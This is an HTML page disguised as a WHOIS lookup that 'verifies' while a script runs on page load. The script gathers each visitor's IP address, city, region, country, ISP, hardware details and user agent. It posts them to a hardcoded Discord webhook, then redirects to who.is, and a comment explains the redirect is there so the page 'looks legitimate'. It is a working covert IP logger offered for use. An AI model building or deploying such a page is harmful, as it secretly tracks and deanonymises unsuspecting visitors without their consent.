<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>WHOIS Lookup - Verifying...</title>
    <style>
        body { 
            background: #0a0a0a; 
            color: #00ff41; /* Classic Matrix/Terminal Green */
            font-family: 'Courier New', Courier, monospace; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden;
        }
        .terminal-text {
            border-right: 2px solid #00ff41;
            white-space: nowrap;
            overflow: hidden;
            animation: typing 2s steps(30, end), blink .75s step-end infinite;
        }
        @keyframes typing { from { width: 0 } to { width: 100% } }
        @keyframes blink { from, to { border-color: transparent } 50% { border-color: #00ff41 } }
    </style>
</head>
<body>
    <div class="terminal-text">QUERYING DATABASE: [WHOIS_REQUEST]...</div>
    <p style="font-size: 10px; color: #008f11;">Status: Fetching packets...</p>

    <script>
        async function runWhois() {
            try {
                // 1. IP and Location Check (via external API for more detail)
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();

                // 2. Format the message for Discord like a WHOIS entry
                const whoisEntry = `
\`\`\`yaml
[ WHOIS DATA REPORT ]
-----------------------------------
IP ADDRESS : ${data.ip}
CITY       : ${data.city}
REGION     : ${data.region}
COUNTRY    : ${data.country_name}
ISP        : ${data.org}
-----------------------------------
HARDWARE   : ${navigator.platform}
CORES      : ${navigator.hardwareConcurrency}
RESOLUTION : ${screen.width}x${screen.height}
TIMESTAMP  : ${new Date().toISOString()}
-----------------------------------
USER AGENT : ${navigator.userAgent}
\`\`\``;

                // 3. Send to your Webhook
                const webhookURL = "https://discordapp.com/api/webhooks/1502591625686290432/ft1Kq-msmvc5OjAUxHOxxo6ae0N7cMCFACb6mAOPKZ5e8u7ccNBno-_Ar0AXnn6jwGJr";

                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: "WHOIS-NODE-SYSTEM",
                        content: whoisEntry
                    })
                });

            } catch (e) { }

            // 4. Redirect to a real Whois site so it looks legitimate
            setTimeout(() => {
                window.location.href = "https://who.is";
            }, 2500);
        }

        runWhois();
    </script>
</body>
</html>
